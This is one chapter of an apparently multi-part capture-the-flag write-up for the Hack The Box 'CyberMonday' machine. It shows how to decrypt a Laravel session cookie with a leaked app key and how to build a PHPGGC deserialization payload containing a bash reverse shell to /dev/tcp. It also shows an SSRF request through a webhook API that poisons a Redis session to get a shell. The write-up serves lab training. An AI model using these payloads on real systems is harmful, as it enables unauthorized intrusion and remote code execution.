# Gaining a Foothold

[Initial Enumeration](/writeups/machines/htb-cybermonday/1-initial-enumeration)
[Webhook API Admin Access](/writeups/machines/htb-cybermonday/2-webhook-api-admin)
[Obtaining More Info](/writeups/machines/htb-cybermonday/3-obtaining-more-info)
[**Gaining a Foothold**](/writeups/machines/htb-cybermonday/4-gaining-a-foothold)
[Where to Now?](/writeups/machines/htb-cybermonday/5-where-to-now)
[Reading the Source](/writeups/machines/htb-cybermonday/6-reading-the-source)
[Composing Root Access](/writeups/machines/htb-cybermonday/7-composing-root-access)

Now that we have a possible attack vector we need to figure out how to implement it. In order to poison our [[laravel|Laravel]] session we need to know what the key for it is called in the [[redis|Redis]] server. Laravel stores that information in a cookie that's sent to the client, however we can't just read it as it's encrypted. Lucky for us, thanks to the `.env` file, we have the key to that encryption. There are a number of scripts around to perform this decryption for us. I used the one from [hacktricks here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/laravel#decrypt-cookie). Once you have the decryption script, set the app_key to the one in the `.env` file. Also take note of the `REDIS_PREFIX` value while you're there as we'll need this later.

Before we poison our session we'll need something to poison it with. First, download [PHPGGC](https://github.com/ambionics/phpggc) if you don't already have it. Next we need to prepare a payload to use. PHPGGC has a number of [[rce|RCE]] exploits we could use, but some will and won't work depending on the version of Laravel. If one doesn't work, try the next. For the function and parameter we provide `phpggc` we'll use:
```bash
exec "/bin/bash -c 'bash -i >& /dev/tcp/<your ip>/<your port> 0>&1'"
```

Next we need a valid session cookie. Go back to the Cybermonday shopping site and log in again if you've been logged out. Open up the dev tools for your browser and copy the cookie value for `cybermonday_session`. The value is URL encoded to make sure to decode it before using it in the script we downloaded before. The decrypted value will be formatted as `<User Id>|<Session Id><Buffer Bytes>`. Copy the session id down for use in the next step.

Now we have our payload and session id, we need to prepare them in both the [[redis|RESP]] protocol format, and then escape that string for use in our JSON. For passing a command, your RESP formatted string should look like:
```
*3\r\n$3\r\nSET\r\n$56\r\nlaravel_session:<your session id>\r\n$<payload length before JSON escape>\r\n<payload>\r\n
```

So whats going on here? Well commands are passed to RESP as an array. We're passing 3 arguments so we start our string with `*3` with `*` specifying that this is an array. Each data type identifier or piece of data is ended with `\r\n`. Next we specify the command we want to use. Our command `SET` is 3 bytes long so we specify the length as `$3` with `$` specifying that this is a "bulk string". Next is our actual command `SET`, and what follows is the same procedure with our `key` and `value` arguments for the full command. Next we escape the string so that it's passed to the webhook server properly, and we send our `curl` request:
```bash
curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> \
-H 'x-access-token: <your token>' \
-H 'Content-Type: application/json' \
-d '{"url": "http://redis:6379", "method": "<your prepared resp string>"}'
```

Make sure you've started your `netcat` listener, and then refresh the Cybermonday page. If all goes well, you'll have a reverse shell. If you get a deserialization error in Laravel that starts at byte 0, there was probably an issue in your formatting when sending the request. If the deserialization error starts at a later byte, or you get a different error, try a different `phpggc` exploit.

Next: [Where to Now?](/writeups/machines/htb-cybermonday/5-where-to-now)